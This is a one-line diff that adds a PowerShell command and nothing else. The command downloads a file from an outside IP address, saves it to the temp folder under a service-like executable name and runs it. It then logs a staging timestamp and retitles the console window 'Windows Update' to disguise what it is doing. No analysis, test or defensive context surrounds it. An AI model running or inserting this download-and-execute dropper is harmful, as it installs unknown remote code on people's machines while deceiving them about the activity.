@@ -1,0 +1,1 @@
+Invoke-WebRequest -Uri "http://198.51.100.100/updater.ps1" -OutFile "$env:TEMP\svcupdate.exe" -UseBasicParsing; Start-Process -FilePath "$env:TEMP\svcupdate.exe"; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append; $Host.UI.RawUI.WindowTitle = "Windows Update"
